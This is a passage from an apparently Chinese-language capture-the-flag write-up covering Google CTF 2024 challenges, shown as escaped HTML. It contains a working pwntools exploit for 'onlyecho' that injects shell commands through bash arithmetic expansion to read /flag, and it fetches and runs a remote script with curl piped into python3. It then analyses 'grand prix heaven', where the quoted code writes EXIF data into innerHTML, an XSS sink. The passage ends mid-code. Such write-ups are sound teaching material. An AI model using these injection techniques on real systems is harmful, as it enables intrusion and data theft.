id=\"exploit\"\u003eexploit\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e pwn\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e base64\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e sys\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e subprocess\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e pwn\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eremote(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;onlyecho.2024.ctfcompetition.com\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1337\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003egenpayload\u003c/span\u003e(cmd):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;payload=\u0026#39;arr[$(\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003ecmd\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e)]\u0026#39;; echo $(( payload == 1 )); \u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estdout\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ebuffer\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ewrite(r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvuntil(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;) solve \u0026#39;\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etoken \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvuntil(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estdout\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ebuffer\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ewrite(token)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etoken \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e token\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estrip()\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esendline(subprocess\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erun(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;bash -c \u0026#34;python3 \u0026lt;(curl -sSL https://goo.gle/kctf-pow) solve \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003etoken\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;\u003c/span\u003e, shell\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e, capture_output\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estdout\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estrip())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estdout\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ebuffer\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ewrite(r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvrepeat(timeout\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esendline(genpayload(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cat /flag \u0026gt; /proc/1/fd/1\u0026#39;\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eencode())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estdout\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ebuffer\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ewrite(r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvrepeat(timeout\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"flag\"\u003eFlag\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/da8df9df-d116-4fd3-8704-363ae2931c8e\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eCTF{LiesDamnedLiesAndBashParsingDifferentials}\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"grand-prix-heaven\"\u003egrand prix heaven\u003c/h2\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/7570101d-444d-444f-b05e-72170b0b3698\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch3 id=\"概述-1\"\u003e概述\u003c/h3\u003e\n\u003cp\u003e這題有個網頁\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/c534a673-d576-4aae-9acd-513b1fa7731a\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e可以 post 自己喜歡的車的圖片以及他的資訊，也可以用網址查看 post 後的車\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/85a74c69-789d-483a-99ad-aa6b43b63e5f\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/ec752fca-8fe5-4a61-8b37-835eaf467a3e\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e接著他有兩個 server，一個是網頁，另一個是 template server，都是 nodejs，首先看看首頁的後端程式，我們可以注意到所有的 frontend route 都會有一個 template pieces，接著 web server 會把這個 template pieces 用 \u003ccode\u003emultipart/form-data\u003c/code\u003e 送到 template server，然後 template server 會依照這個 list 組合成一個 html 並回傳，然後 web server 再回傳這個 html 給 client。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eapp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eget\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003easync\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eres\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;csp\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;head_end\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;index\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;footer\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    };\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eawait\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eneedle\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003epost\u003c/span\u003e(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003eTEMPLATE_SERVER\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      { \u003cspan style=\"color:#a6e22e\"\u003emultipart\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eboundary\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eBOUNDARY\u003c/span\u003e },\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eresp\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ebody\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003ethrow\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e Error(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eres\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003esend\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebody\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    );\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  } \u003cspan style=\"color:#66d9ef\"\u003ecatch\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003econsole\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e`ERROR IN /:\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eres\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003estatus\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e500\u003c/span\u003e).\u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e({ \u003cspan style=\"color:#a6e22e\"\u003eerror\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error\u0026#34;\u003c/span\u003e });\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e});\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e再來講講 template server，他有很多用來組合網頁的零件，其中 \u003ccode\u003eapiparser\u003c/code\u003e 跟 \u003ccode\u003emediaparser\u003c/code\u003e 最有趣，他分別對應到 \u003ccode\u003eapiparser.js\u003c/code\u003e 與 \u003ccode\u003emediaparser.js\u003c/code\u003e 這兩個都是用來處理如何顯示 post 後的車的頁面，其中 mediaparser 被棄用，再 web server 裡完全看不到他，我們來看看程式碼。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eaddEventListener\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;load\u0026#34;\u003c/span\u003e, (\u003cspan style=\"color:#a6e22e\"\u003eevent\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eparams\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eURLSearchParams\u003c/span\u003e(window.\u003cspan style=\"color:#a6e22e\"\u003elocation\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003esearch\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erequester\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eRequester\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eparams\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eget\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;F1\u0026#39;\u003c/span\u003e));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresult\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erequester\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003emakeRequest\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eresult\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ethen\u003c/span\u003e((\u003cspan style=\"color:#a6e22e\"\u003eresp\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eresp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eheaders\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eget\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;content-type\u0026#39;\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;image/jpeg\u0026#39;\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etitleElem\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e document.\u003cspan style=\"color:#a6e22e\"\u003egetElementById\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;title-card\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edateElem\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e document.\u003cspan style=\"color:#a6e22e\"\u003egetElementById\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;date-card\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edescElem\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e document.\u003cspan style=\"color:#a6e22e\"\u003egetElementById\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;desc-card\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#a6e22e\"\u003eresp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003earrayBuffer\u003c/span\u003e().\u003cspan style=\"color:#a6e22e\"\u003ethen\u003c/span\u003e((\u003cspan style=\"color:#a6e22e\"\u003eimgBuf\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              \u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etags\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eExifReader\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eload\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eimgBuf\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              \u003cspan style=\"color:#a6e22e\"\u003edescElem\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003einnerHTML\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etags\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ImageDescription\u0026#39;\u003c/span\u003e].\u003cspan style=\"color:#a6e22e\"\u003edescription\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              \u003cspan style=\"color:#a6e22e\"\u003etitleElem\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003einnerHTML\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etags\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;UserComment\u0026#39;\u003c/span\u003e].\u003cspan style=\"color:#a6e22e\"\u003edescription\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              \u003cspan style=\"color:#a6e22e\"\u003edateElem\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003einnerHTML\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etags\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ICC Profile Date\u0026#39;\u003c/span\u003e].\u003cspan style=\"color:#a6e22e\"\u003edescription\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          })\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    })\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  } \u003cspan style=\"color:#66d9ef\"\u003ecatch\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003econsole\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;an error occurred with the Requester class.\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e});\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可以看到他會讓 browser 依照 \u003ccode\u003eF1\u003c/code\u003e 這個 param 所設的路徑去取得 \u003ccode\u003ehttps://grandprixheaven-web.2024.ctfcompetition.com/api/get-car/\u0026lt;F1\u0026gt;\u003c/code\u003e 這個網站的內容，如果內容是 jpg 圖片的話，就解析圖片的一些資訊並讓前端顯示對應欄位的資料，這邊可以看到他是用 \u003ccode\u003einnerHTML\u003c/code\u003e 也就是說會有 \u003ccode\u003eXSS\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e至於 \u003ccode\u003eapiparser\u003c/code\u003e 其實內容差不多。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eaddEventListener\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;load\u0026#34;\u003c/span\u003e, (\u003cspan style=\"color:#a6e22e\"\u003eevent\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eparams\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eURLSearchParams\u003c/span\u003e(window.\u003cspan style=\"color:#a6e22e\"\u003elocation\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003esearch\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erequester\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eRequester\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eparams\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eget\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;F1\u0026#39;\u003c/span\u003e));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresult\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erequester\u003c/span\u003e.\u003cspan 